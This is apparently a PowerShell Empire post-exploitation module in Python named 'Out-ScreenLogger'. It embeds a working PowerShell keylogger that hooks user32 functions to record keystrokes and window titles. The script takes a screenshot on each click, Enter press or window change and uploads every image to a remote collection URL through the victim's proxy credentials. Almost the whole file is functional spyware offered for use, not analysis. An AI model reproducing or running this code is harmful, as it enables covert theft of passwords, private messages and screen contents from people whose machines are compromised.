from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Out-ScreenLogger',

            'Author': ['@hillar'],

            'Description': ('Takes and uploads screenshots on mouseclikc or enter key'),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',

            'Comments': [
                'https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/collection/screenshot.py',
                'https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/collection/keylogger.py'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   'kala'
            },
            'SavePath' : {
                'Description'   :   'Specifies the directory name for saved screenshots.',
                'Required'      :   True,
                'Value'         :   'c:\Windows\Temp'

            },
            'Url' : {
                'Description'   :   'Specifies the URL for which a upload will be done.',
                'Required'      :   True,
                'Value'         :   'http://192.168.33.22/upload.php'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # read in the common module source code
        #moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Out-ScreenStrokes.ps1"

        #try:
        #    f = open(moduleSource, 'r')
        #except:
        #    print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
        #    return ""

        #moduleCode = f.read()
        #f.close()

        script =  """
function Get-Screenstrokes
{

    [CmdletBinding()]
    Param (

        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $SavePath,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Agent,

        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $Url


    )
    if (Test-Path $SavePath) {
        [String] $url = "$Url`?agent=$Agent"
        $wc = new-object system.net.WebClient
        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
        try{
            $response = $wc.DownloadData($url);
        }
        catch [System.Net.WebException]{
            "ERROR $Url failed"
            exit
        }
        finally {
            $wc.Dispose()
        }

        "starting screenlogger on $Agent uploading to $Url (if failed save to $SavePath)`n"
        function Get-Screenshot
        {
            #[String] $Path = "c:\Windows\Temp\"
            $Time = (Get-Date)
            [String] $FileName = "Screen Shot $($Time.Year)"
            $FileName += '-'
            $FileName += "$($Time.Month)"
            $FileName += '-'
            $FileName += "$($Time.Day)"
            $FileName += ' at '
            $FileName += "$($Time.Hour)"
            $FileName += '.'
            $FileName += "$($Time.Minute)"
            $FileName += '.'
            $FileName += "$($Time.Second)"
            $FileName += '.png'
            $Bytes = [System.Text.Encoding]::Unicode.GetBytes($FileName)
            $EncodedName =[Convert]::ToBase64String($Bytes)
            [String] $FilePath = (Join-Path $SavePath $EncodedName)
            if (-not ($FilePath | Test-Path)) {
              Add-Type -Assembly System.Windows.Forms
              $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
              $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
              $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
              $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
              $DrawingGraphics.Dispose()
              $ScreenshotObject.Save($FilePath, [Drawing.Imaging.ImageFormat]::Png)
              $ScreenshotObject.Dispose()

                #[String] $url = "http://192.168.1.111/"
                $wc = new-object system.net.WebClient
                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                try{
                  $response = $wc.UploadFile($url,"POST",$FilePath);
                  Remove-Item $FilePath
                  "upload ok :: $FilePath"
                }
                catch [System.Net.WebException]{
                  "upload failed, download from :: $FilePath"
                }
                finally {
                  $wc.Dispose()
                }

            }
        }
        $sc = (Get-Screenshot)
        $sc
        [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null

            try
            {
                $ImportDll = [User32]
            }
            catch
            {
                $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
                $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
                $TypeBuilder = $ModuleBuilder.DefineType('User32', 'Public, Class')

                $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
                $FieldArray = [Reflection.FieldInfo[]] @(
                    [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
                )

                $PInvokeMethod = $TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
                $FieldValueArray = [Object[]] @(
                    'GetAsyncKeyState',
                    $True,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('GetKeyboardState', 'Public, Static', [Int32], [Type[]] @([Byte[]]))
                $FieldValueArray = [Object[]] @(
                    'GetKeyboardState',
                    $True,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('MapVirtualKey', 'Public, Static', [Int32], [Type[]] @([Int32], [Int32]))
                $FieldValueArray = [Object[]] @(
                    'MapVirtualKey',
                    $False,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('ToUnicode', 'Public, Static', [Int32],
                    [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
                $FieldValueArray = [Object[]] @(
                    'ToUnicode',
                    $False,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
                $FieldValueArray = [Object[]] @(
                    'GetForegroundWindow',
                    $True,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $ImportDll = $TypeBuilder.CreateType()
            }

            $LastWindowTitle = ""

            while ($true) {
                Start-Sleep -Milliseconds 40
                $gotit = ""
                $Outout = ""

                for ($char = 1; $char -le 254; $char++) {
                    $vkey = $char
                    $gotit = $ImportDll::GetAsyncKeyState($vkey)

                    if ($gotit -eq -32767) {

                        #check for keys not mapped by virtual keyboard
                        $LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
                        $RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
                        $LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
                        $RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
                        $LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
                        $RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
                        $TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
                        $SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
                        $DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
                        $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
                        $BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
                        $LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
                        $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
                        $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
                        $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
                        $LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
                        $RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000

                        if ($LeftShift -or $RightShift) {$Outout += '[Shift]'}
                        if ($LeftCtrl  -or $RightCtrl)  {$Outout += '[Ctrl]'}
                        if ($LeftAlt   -or $RightAlt)   {$Outout += '[Alt]'}
                        if ($TabKey)       {$Outout += '[Tab]'}
                        if ($SpaceBar)     {$Outout += '[SpaceBar]'}
                        if ($DeleteKey)    {$Outout += '[Delete]'}
                        if ($BackSpaceKey) {$Outout += '[Backspace]'}
                        if ($LeftArrow)    {$Outout += '[Left Arrow]'}
                        if ($RightArrow)   {$Outout += '[Right Arrow]'}
                        if ($UpArrow)      {$Outout += '[Up Arrow]'}
                        if ($DownArrow)    {$Outout += '[Down Arrow]'}
                        if ($LeftMouse)    {$Outout += '[Left Mouse]'}
                        if ($RightMouse)   {$Outout += '[Right Mouse]'}
                        if ([Console]::CapsLock) {$Outout += '[Caps Lock]'}

                        if ($EnterKey)     {
                             $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                             $sc = (Get-Screenshot)
                             $Outout += "`n[Enter] - $TimeStamp - screenshot file :: $sc`n"
                        }
                        if ($RightMouse)   {
                          $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                          $sc = (Get-Screenshot)
                          $Outout += "`n[Right Mouse] - $TimeStamp - screenshot file :: $sc`n"
                        }
                        if ($LeftMouse)   {
                          $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                          $sc = (Get-Screenshot)
                          $Outout += "`n[Left Mouse] - $TimeStamp - screenshot file :: $sc`n"
                        }

                        $scancode = $ImportDll::MapVirtualKey($vkey, 0x3)

                        $kbstate = New-Object Byte[] 256
                        $checkkbstate = $ImportDll::GetKeyboardState($kbstate)

                        $mychar = New-Object -TypeName "System.Text.StringBuilder";
                        $unicode_res = $ImportDll::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)

                        #get the title of the foreground window
                        $TopWindow = $ImportDll::GetForegroundWindow()
                        $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle

                        #if ($unicode_res -gt 0) {
                            if ($WindowTitle -ne $LastWindowTitle){
                                # if the window has changed
                                $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
        			                  $sc = (Get-Screenshot)
                                $Outout = "`n[Window Change] $WindowTitle - $TimeStamp - screenshot file :: $sc`n"
                                $LastWindowTitle = $WindowTitle
                            }
                            $Outout += $mychar.ToString()
                            $Outout
                        #}
                    }
                }
            }




    }
    else {
        "ERROR $SavePath does not exist"
    }

}
Get-Screenstrokes"""

        for option,values in self.options.iteritems():
            if values['Value'] and values['Value'] != '':
                #if option != "Agent" :
                    script += " -" + str(option) + " " + str(values['Value'])


        return script
